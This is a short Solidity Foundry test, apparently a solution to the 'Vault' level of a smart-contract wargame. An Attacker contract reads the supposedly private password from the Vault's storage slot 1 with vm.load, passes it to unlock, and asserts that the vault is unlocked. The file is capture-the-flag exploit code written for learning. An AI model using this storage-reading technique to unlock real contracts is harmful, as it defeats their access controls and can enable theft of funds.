// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../instances/Ilevel08.sol";

contract Attacker is Test {
    Vault level08 = Vault(0xc8cF15a497D7a670369A5b26E15810d2e6A97373);

    function test() external {
        bytes32 password = vm.load(address(level08), bytes32(uint256(1)));
        level08.unlock(password);

        assertEq(level08.locked(), false);
    }
}
